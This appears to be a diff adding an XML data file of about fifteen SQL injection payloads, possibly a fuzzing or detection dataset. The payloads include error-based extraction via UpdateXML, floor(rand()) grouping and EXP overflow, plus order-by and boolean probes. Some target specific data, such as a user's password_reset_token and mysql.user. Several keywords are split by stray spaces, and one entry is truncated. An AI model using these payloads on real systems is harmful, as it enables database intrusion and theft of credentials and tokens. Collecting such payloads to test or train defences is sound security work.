@@ -1,0 +1,62 @@
+<root>
+	<element>
+		<id>0</id>
+		<payload>and UpdateXML(1,CONCAT(0x5b,mid((SELECT passw ord_reset_token from gpk_main.users where id=1),1,32),0x5d),1)</payload>
+	</element>
+	<element>
+		<id>1</id>
+		<payload>*</payload>
+	</element>
+	<element>
+		<id>2</id>
+		<payload>'</payload>
+	</element>
+	<element>
+		<id>3</id>
+		<payload>+ orDER+BY+2</payload>
+	</element>
+	<element>
+		<id>4</id>
+		<payload>-(case when(1=2) then dateline else membernum end)</payload>
+	</element>
+	<element>
+		<id>5</id>
+		<payload>order by 1,If((1=2),1,(select user from mysql.user))--</payload>
+	</element>
+	<element>
+		<id>6</id>
+		<payload>'  and (select 1 from(select count(*),concat(0x7c,(select (Select version()) from inf ormation_schema.tables limit 0,1),0x7c,flo or(r and(0)*2))x from inf ormation_schema.tables group by x limit 0,1)a)%23/wapc/5000_0005_003</payload>
+	</element>
+	<element>
+		<id>7</id>
+		<payload>%22%2bEXP(~(select%20*%20from%20(select%20group_concat(table_name)%20from%20inf ormation_schema.tables%20where%20table_schema=%27activity_manage%27)a))%2b%22bb</payload>
+	</element>
+	<element>
+		<id>8</id>
+		<payload>and length(user())=19</payload>
+	</element>
+	<element>
+		<id>9</id>
+		<payload>'  and (select 1 from(select count(*),concat(0x7c,(select (Select version()) from inf ormation_schema.tables limit 0,1),0</payload>
+	</element>
+	<element>
+		<id>10</id>
+		<payload>and UpdateXML(1,CONCAT(0x5b,mid((SELECT user()),1,32),0x5d),1)</payload>
+	</element>
+	<element>
+		<id>11</id>
+		<payload>%20 and%20UpdateXML%281,CONCAT%280x5b,mid%28%28SELECT%20database%28%29%29,1,32%29,0x5d%29,1%29%23 + orDER+BY+1</payload>
+	</element>
+	<element>
+		<id>12</id>
+		<payload>(select 1 from (select count(*), concat(flo or(r and(0)*2), 0x5e5e5e,user()) x from inf ormation_schema.character_sets group by x)y)</payload>
+	</element>
+	<element>
+		<id>13</id>
+		<payload>%20 and%20exists%28select%20passw ord%20from%20system_user%29%23</payload>
+	</element>
+	<element>
+		<id>14</id>
+		<payload>and length(user())=19</payload>
+	</element>
+</root>
